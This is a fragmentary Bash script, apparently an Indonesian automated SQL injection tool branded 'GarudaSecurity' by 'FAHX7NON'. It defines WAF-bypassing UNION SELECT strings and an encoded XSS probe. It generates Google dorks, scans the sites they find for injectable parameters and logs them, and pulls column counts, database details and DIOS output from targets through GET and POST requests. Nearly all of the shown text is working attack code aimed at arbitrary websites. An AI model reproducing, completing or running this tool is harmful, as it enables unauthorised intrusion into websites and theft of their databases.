...
#output ressult
injected_site="inject-sql.txt" #Result history site yg injected dri pertama kali psqli di gunakan
...
error_site="tidak-bisa.txt" #site yg tidak bisa di inject
...
bof3="+AND+MOD(52,12)+/*!50000UNION/**_**/*/+/*!50000SELECT/**_**/*/"
bof4="/**8**/and/**8**/0/**8**/UniOn/**8**/sEleCT/**8**/"
...
xss_payload="%22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e" #jika mau diganti alert nya beri tulisan "FAHX7NON"
...
▒▒▒▒▒▒▒▒${N}▄▄▄▄▄▄▄▄${R}▒▒▒▒▒▒
▒▒${N}█${R}▒▒▒${N}▄██████████▄${R}▒▒▒▒   ${N}⊱⋅ ──────────── ⋅⊰⊱⋅${R}
▒${N}█▐${R}▒▒▒${N}████████████${R}▒▒▒▒       ${P}  GarudaSecurity${R}
▒${N}▌▐${R}▒▒${N}██▄▀██████▀▄██${R}▒▒▒  ${N} ⊱⋅ ──────────── ⋅⊰⊱${N}⋅
${N}▐┼▐${R}▒▒${N}██▄▄▄▄██▄▄▄▄██${R}▒▒▒   ${BL}Author: ${BR}./FAHX7NON${N} 
...
${G}█████████
${G}█▄█████▄█ 
${G}█▼▼▼▼▼     ${U}Author ${N}by ${R}FAHX7NON
${G}█          ${BL}pwnd ./GarudaSecurity
${G}█▲▲▲▲▲     
${G}█████████
${G}__██____██___
...
case $n in
   1) clear
      ...
      echo -en "\033[1m$N[$G!$N] Masukan url taget: "
      read target
      bypass
...
gen() {
  echo -e "                |\033[7;32m Dork generator by FAHX7NON  ${N}|\n\n${O}cth: product cart buy${N}"
...
dorkscan() {
  ...
  for admin in `echo "$admin_dork" | tr -d '\0' | sed 's/\r$//'`
   ...
   if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -sL --max-time $time_out "$b$xss_payload" | grep -Po "FAHX7NON" | tr -d '\0' | sed 's/\r$//' >/dev/null
   then
...
info() {
  #echo -e "$by \n $waff"
   ...
   echo -e "$angka" |  sed 's/FAHX7NON//g' | grep -a -o '[0-9]' > .angka
   if cat .angka >/dev/null
   then
      if echo $ngecur | grep -Po "where clause" >/dev/null
      then
        df=$(echo $ngecur | grep -Po "FAHX7NON[0-9]*" | sed 's/FAHX7NON//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'FAHX7NON[0-9]*' > .angka
        cat .angka |  sed 's/FAHX7NON//g' > .angka
      fi
    if [[ "$based64" = "y" ]]
    then
   ...
   do
    ...
    then
       ...
       info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base94" | grep -a -o "FAHX7NON&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/FAHX7NON/d' | tr -d '\0' | sed 's/\r$//')
    else #php
       if [[ "$html" = "y" ]]
       then
          if [[ "$corona" = "y" ]];then
       ...
       then
          dk=$(echo -e "$union$db")
          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$dk" | grep -a -o "FAHX7NON
          &[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/FAHX7NON/d' | tr -d '\0' | sed 's/\r$//')
       else
          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$dk" | grep -a -o "FAHX7NON&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/FAHX7NON/d' | tr -d '\0' | sed 's/\r$//')
       fi
...
dios() {
  ...
  if cat .angka >/dev/null
  then
    if echo $ngecur | grep -Po "Unknown column 'FAHX7NON[0-9]*'" >/dev/null
    then
        df=$(echo $ngecur | grep -Po "FAHX7NON[0-9]*" | sed 's/FAHX7NON
        //g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'FAHX7NON[0-9]*' > .angka
        cat .angka |  sed 's/FAHX7NON//g' > .angka
...
for i in $(seq $order_start $order_by)
  do
   ...
   if [ $? -eq 0 ]
    ...
    if echo "$ngecur" | grep -Po "FAHX7NON3|FAHX7NON[0-9]*" > .angka
      then
...
\033[1m$N[$R+$N] ${R}PSQLI FINAL MOD${N}
